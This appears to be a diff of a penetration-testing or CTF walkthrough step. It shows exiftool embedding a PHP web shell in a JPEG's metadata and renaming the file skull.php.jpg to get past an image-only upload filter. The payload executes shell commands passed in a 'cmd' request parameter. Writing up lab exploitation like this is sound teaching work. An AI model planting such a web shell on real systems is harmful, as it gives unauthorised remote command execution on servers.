@@ -61,7 +61,8 @@ toc: true
 3. The upload only allows us to upload images. Trying to upload a script or .php-file and changing the mime type through burp is not
    possible. Instead we can create a malicious .jpg-file with embedded code to give us code execution.
 
-   root@nidus:~/Pictures# exiftool -DocumentName="<h1>Player Three Has Entered The Game<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" skull.jpg
+   root@nidus:~/Pictures# exiftool -DocumentName="<h1>Player Three Has Entered The Game
+<?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" skull.jpg
     1 image files updated
 
    root@nidus:~/Pictures# mv skull.jpg skull.php.jpg
